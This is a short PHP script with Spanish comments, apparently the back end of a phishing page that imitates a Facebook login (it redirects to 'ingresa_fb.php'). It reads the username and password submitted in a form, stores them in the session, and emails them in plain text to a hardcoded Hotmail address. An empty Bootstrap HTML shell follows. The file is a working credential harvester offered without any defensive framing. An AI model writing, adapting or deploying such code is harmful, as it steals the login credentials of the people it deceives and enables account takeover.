<?php
    /* Empezamos la sesión */
    session_start();
     
    /* Creamos la sesión */
    $_SESSION['usuario'] = $_POST['usuario'];
    $_SESSION['pass'] = $_POST['pass'];
    $ja=$_POST['pass'];
    $jo=$_POST['usuario'];
    $unido="Usuario:".$jo."\nContraseña:".$ja;
    /* Si no hay una sesión creada, redireccionar al index. */
    if(empty($_SESSION['usuario'])) { // Recuerda usar corchetes.
        header('Location: ingresa_fb.php');
    } // Recuerda usar corchetes

    if(@mail('jhofe_s17@hotmail.com', utf8_decode('contraseña'), $unido)){
    	
    }
    else{
    	echo "me fui al carajo";
    }
?>
     
<!DOCTYPE html>
<html lang="es">
    <head>
            <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title></title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width">

        <link rel="stylesheet" href="css/bootstrap.min.css">
        <style>
            body {
                padding-top: 60px;
                padding-bottom: 40px;
            }
        </style>
        <link rel="stylesheet" href="css/bootstrap-responsive.min.css">
        <link rel="stylesheet" href="css/main.css">

        <script src="js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
    </head>
     
    <body>
        <div class="row-fluid">
            <div class="span12"> </div>
        </div>
            
    <body>